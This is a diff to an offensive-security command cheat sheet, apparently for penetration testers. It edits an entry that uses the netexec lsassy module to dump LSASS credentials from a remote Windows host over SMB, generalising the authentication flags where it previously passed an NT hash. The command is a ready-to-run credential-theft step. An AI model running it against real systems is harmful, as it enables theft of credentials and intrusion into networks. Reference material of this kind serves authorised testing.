@@ -144,17 +144,17 @@ var rhost_ip
 
 ### lsassy (netexec module)
 
-#python #smb #pth #lsass-dump #remote
+#python #smb #multi-auth #lsass-dump #remote
 
 Remotely extract LSASS credentials using lsassy as a netexec module.
 
 ```sh title:"Remote LSASS dump via lsassy netexec module"
-nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" -M lsassy
+nxc smb "$rhost_ip" -d "$domain" -u "$user" $auth_flags -M lsassy
 ```
 <!-- cheat
 import domain_ip
 import users
-var nt_hash
+import nxc_auth
 var rhost_ip
 -->
 
